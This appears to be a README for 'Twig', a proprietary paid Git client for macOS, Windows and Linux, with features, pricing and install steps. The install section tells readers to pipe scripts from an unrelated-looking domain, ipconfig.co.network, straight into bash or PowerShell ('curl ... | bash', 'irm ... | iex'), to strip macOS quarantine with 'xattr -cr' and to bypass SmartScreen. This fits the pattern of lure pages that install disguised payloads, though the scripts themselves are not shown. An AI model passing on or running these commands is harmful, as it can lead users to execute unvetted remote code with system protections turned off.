<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="icon-512.png">
    <source media="(prefers-color-scheme: light)" srcset="icon-512-light.png">
    <img src="icon-512-light.png" width="160" height="160" alt="Twig icon">
  </picture>
</p>

<h1 align="center">Twig</h1>

<p align="center"><b>Twig — a tiny, fast Git client for macOS, Windows and Linux</b></p>

<p align="center">
  Version <b>1.0.0</b> · released 08 Oct 2026 ·
  <a href="https://github.com/JKS-sys/twig-08-oct-2026-releases/releases/latest">Download</a> ·
  <a href="https://ipconfig.co.network/twig">Website</a> ·
  <a href="RELEASE-NOTES.md">Release notes</a>
</p>

<p align="center">
  <img src="icon-512.png" width="96" height="96" alt="Twig icon, dark">&nbsp;&nbsp;
  <img src="icon-512-light.png" width="96" height="96" alt="Twig icon, light">
</p>

Twig is a native desktop Git client of a few megabytes. It runs the real `git` you already have, so
everything it does is ordinary Git — nothing to migrate, nothing hidden.

## Features

- **Commit graph** — branches and merges drawn as lanes, with search by message and author
- **Hunk & line staging** — stage or discard a whole file, one hunk, or single lines
- **Branches, tags and remotes** — create, rename, check out, delete, fetch, pull, push
- **Stash manager** — save, apply, pop, preview and drop stashes
- **Interactive rebase** — reorder, squash, fixup, reword and drop commits
- **Cherry-pick, revert and reset** — soft, mixed or hard, from any commit in the graph
- **Blame & file history** — who changed each line, and every version of a file
- **Conflict resolver** — ours / theirs / both per conflict, then mark resolved
- **Insights** — a contribution heatmap and per-author activity
- **Clone and init** — start from a URL or an empty folder
- **Multi-repo tabs** — keep several repositories open side by side
- **Command palette** — every action from the keyboard
- **Synthesized sound effects** — tiny Web Audio cues, one toggle to mute
- **Animations** — short, calm motion that respects “reduce motion”
- **Light and dark themes** — follows the system or your choice

## Screenshots

| | |
|---|---|
| ![Welcome screen](screenshots/welcome.png) <br> *Welcome — open, clone or init a repository* | ![Changes](screenshots/changes.png) <br> *Changes — stage hunks or single lines* |
| ![History](screenshots/history.png) <br> *History — the commit graph with branches and tags* | ![Insights](screenshots/insights.png) <br> *Insights — activity heatmap and authors* |
| ![Twig Pro](screenshots/pro.png) <br> *Twig Pro — plans and activation* | |

## Install

**macOS** (Apple silicon and Intel) — Terminal:

```bash
curl -fsSL https://ipconfig.co.network/updates/twig/install.sh | bash
```

The installer picks the right build, copies **Twig.app** to `/Applications` and clears the quarantine flag.
If you install from the DMG by hand instead, run this once before the first launch:

```bash
xattr -cr /Applications/Twig.app
```

**Windows** — PowerShell:

```powershell
irm https://ipconfig.co.network/updates/twig/install.ps1 | iex
```

SmartScreen may warn on first launch: *More info → Run anyway*.

**Linux** (x86_64)

- AppImage: `curl -fsSL https://ipconfig.co.network/updates/twig/install.sh | bash` — installs to `~/.local/bin/twig`.
  Or download `Twig_1.0.0_amd64.AppImage` from the [latest release](https://github.com/JKS-sys/twig-08-oct-2026-releases/releases/latest),
  then `chmod +x Twig_*.AppImage && ./Twig_*.AppImage` (needs `libfuse2`).
- Debian / Ubuntu: `curl -fsSL https://ipconfig.co.network/updates/twig/install.sh | bash -s -- --deb`,
  or download `Twig_1.0.0_amd64.deb` and `sudo apt install ./Twig_1.0.0_amd64.deb`.

**Homebrew** — Homebrew without a tap needs an Apple-notarized app; Twig is ad-hoc signed today, so use the curl installer.

Twig updates itself: when a new version is out it offers to install it and restart.

## Pricing

| Free | Pro monthly | Pro yearly |
|---|---|---|
| ₹0 | **₹20 / month** | **₹220 / year** |
| Download and use Twig for free | Renews every month, cancel any time | Renews every year — two months cheaper |

After paying you get an activation code at once; in Twig open **Activate Pro** and paste it.

[Get Twig Pro →](https://ipconfig.co.network/twig/buy?plan=monthly) · [yearly](https://ipconfig.co.network/twig/buy?plan=yearly)

## Links

- Releases and downloads: https://github.com/JKS-sys/twig-08-oct-2026-releases/releases
- Website: https://ipconfig.co.network/twig
- Release notes: [RELEASE-NOTES.md](RELEASE-NOTES.md)
- Update feed: [latest.json](latest.json)

## Creator

Made by Jagadeesh Kumar S, creator — [youtube.com/@JKS-sys](https://www.youtube.com/@JKS-sys)

## Licence

Proprietary. © 2026 Jagadeesh Kumar S. All rights reserved.
The installers are free to download and use; the source code is not published, and copying,
modifying or redistributing Twig is not permitted without written permission.
